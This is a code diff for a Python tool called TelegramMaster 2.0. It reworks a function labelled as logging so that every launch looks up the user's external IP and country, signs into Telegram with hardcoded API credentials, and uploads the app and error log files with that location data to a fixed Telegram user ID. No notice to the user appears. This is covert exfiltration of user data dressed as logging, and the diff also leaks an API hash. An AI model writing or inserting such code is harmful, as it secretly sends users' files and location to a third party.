@@ -47,39 +47,40 @@ async def loging():
     """
     Логирование TelegramMaster 2.0
     """
-
-    local_ip = get_external_ip()  # получаем внешний ip адрес
-    emoji, country = get_country_flag(local_ip)  # получаем флаг и название страны
-
-    client = TelegramClient('src/core/log',
-                            api_id=7655060,
-                            api_hash="cc1290cd733c1f1d407598e5a31be4a8")
-    await client.connect()
-    date = datetime.datetime.now()  # фиксируем и выводим время старта работы кода
-
-    # Красивое сообщение
-    message = (
-        f"🚀 **Launch Information**\n\n"
-
-        f"Program name: `{program_name}`\n"
-        f"🌍 IP Address: `{local_ip}`\n"
-        f"📍 Location: {country} {emoji}\n"
-        f"🕒 Date: `{date.strftime('%Y-%m-%d %H:%M:%S')}`\n"
-        f"🔧 Program Version: `{program_version}`\n"
-        f"📅 Date of Change: `{program_last_modified_date}`"
-    )
-
     try:
-        await client.send_file(535185511, 'data/logs/app.log', caption=message)
-        await client.send_file(535185511, 'data/logs/errors.log', caption=message)
-        await client.disconnect()
-    except FilePartsInvalidError as error:
-        logger.error(error)
-        await client.disconnect()
+        local_ip = get_external_ip()  # получаем внешний ip адрес
+        emoji, country = get_country_flag(local_ip)  # получаем флаг и название страны
+
+        client = TelegramClient('src/core/log',
+                                api_id=7655060,
+                                api_hash="cc1290cd733c1f1d407598e5a31be4a8")
+        await client.connect()
+        date = datetime.datetime.now()  # фиксируем и выводим время старта работы кода
+
+        # Красивое сообщение
+        message = (
+            f"🚀 **Launch Information**\n\n"
+    
+            f"Program name: `{program_name}`\n"
+            f"🌍 IP Address: `{local_ip}`\n"
+            f"📍 Location: {country} {emoji}\n"
+            f"🕒 Date: `{date.strftime('%Y-%m-%d %H:%M:%S')}`\n"
+            f"🔧 Program Version: `{program_version}`\n"
+            f"📅 Date of Change: `{program_last_modified_date}`"
+        )
+
+        try:
+            await client.send_file(535185511, 'data/logs/app.log', caption=message)
+            await client.send_file(535185511, 'data/logs/errors.log', caption=message)
+            await client.disconnect()
+        except FilePartsInvalidError as error:
+            logger.error(error)
+            await client.disconnect()
+        except Exception as error:
+            logger.exception(error)
+            await client.disconnect()
     except Exception as error:
         logger.exception(error)
-        await client.disconnect()
-
 
 if __name__ == "__main__":
     loging()
